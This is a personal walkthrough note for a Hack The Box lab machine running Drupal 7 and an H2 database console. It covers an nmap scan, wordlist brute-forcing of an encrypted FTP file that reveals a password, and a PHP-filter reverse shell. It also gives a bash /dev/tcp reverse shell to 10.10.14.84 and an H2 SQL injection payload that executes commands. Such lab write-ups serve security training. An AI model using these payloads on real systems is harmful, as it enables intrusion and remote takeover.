#ejpt-htb-machines #openssl
# nmap scan

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-27 07:45 CST
Nmap scan report for 10.129.95.193
Host is up (0.0022s latency).
Not shown: 65529 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.84
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Jun 16  2018 messages
22/tcp   open  ssh           OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e4:0c:cb:c5:a5:91:78:ea:54:96:af:4d:03:e4:fc:88 (RSA)
|   256 95:cb:f8:c7:35:5e:af:a9:44:8b:17:59:4d:db:5a:df (ECDSA)
|_  256 4a:0b:2e:f7:1d:99:bc:c7:d3:0b:91:53:b9:3b:e2:79 (ED25519)
80/tcp   open  http          Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: Drupal 7 (http://drupal.org)
|_http-title: Welcome to 192.168.56.103 | 192.168.56.103
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
5435/tcp open  tcpwrapped
8082/tcp open  http          H2 database http console
|_http-title: H2 Console
9092/tcp open  XmlIpcRegSvc?
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :

```

# did some more enumeration, tried drupalgeddon, scanned the site using droopescan, nothing works,

# found a openssl encrypted file in the ftp server, downloaded and decrypted it using [openssl-bruteforce](https://github.com/thosearetheguise/decrypt-openssl-bruteforce)

```shell

python3 decrypt-openssl-bruteforce.py -i ../.drupal.txt.enc -s -b64 -w /usr/share/wordlists/rockyou.txt -o dec.txt

   Daniel,

Following the password for the portal:

PencilKeyboardScanner123

Please let us know when the portal is ready.

Kind Regards,

IT department

```

# The credentials work in admin user, in the admin dashboard page, I enabled php filter then proceed with adding a page that contains a reverse shell


# Found mysql creds on the settings page, used it on daniel user, /var/www/html/sites/default/settings.php

daniel@drupal4hawk


# H2 sqli to rce vulnerabiltiy
https://www.sonarsource.com/blog/dotcms515-sqli-to-rce/

# created a reverse shell bash script on /tmp

```shell
#!/bin/bash

bash -i >& /dev/tcp/10.10.14.84/4444 0>&1

```

# then used it injected an sql payload on h2 sql
```sql
CREATE ALIAS EXEC AS CONCAT('void e(String cmd) throws java.io.IOException',
HEXTORAW('007b'),'java.lang.Runtime rt= java.lang.Runtime.getRuntime();
rt.exec(cmd);',HEXTORAW('007d'));
CALL EXEC('/tmp/bash.sh');
```